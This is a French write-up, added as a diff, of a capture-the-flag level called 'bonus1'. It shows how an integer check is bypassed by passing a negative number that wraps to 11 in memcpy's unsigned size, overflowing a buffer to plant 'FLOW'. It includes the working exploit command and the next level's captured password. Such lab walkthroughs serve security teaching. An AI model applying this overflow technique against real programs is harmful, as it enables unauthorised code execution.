@@ -1,0 +1,18 @@
+Le programme fait un atoi sur le 1er argument, il y ajoute 4.
+Si le resultat est superieur à 9, il return.
+
+On peut donc envoyer au maximum un 5!
+	$ ltrace ./bonus1 5 "blabla"
+	memcpy(0xbffff714, "blabla", 20)
+	$ ltrace ./bonus1 4 "blabla"
+	memcpy(0xbffff714, "blabla", 16)
+
+On remarque qu'il fait un memcpy du 2eme arg, il copie 4 * atoi(argv[1]).
+On a besoin d'overflow sur 44 octets pour envoyer la chaine "FLOW" (0x574f4c46 en hexa) au bon endroit dans la memoire:
+	0x08048478 <+84>:    cmpl   $0x574f4c46,0x3c(%esp)
+Il faudrait donc envoyer 11 en argv[1], mais on ne passera pas le check sur <=9 ...
+
+Sachant que memcpy attend un un size_t, donc unsigned, on va pouvoir underflow en envoyant -2147483637 qui equivaut à 11 en unsigned:
+	$ ./bonus1 "-2147483637" `python -c 'print "A"*40 + "FLOW"'`
+	$$ cat /home/user/bonus2/.pass
+	579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
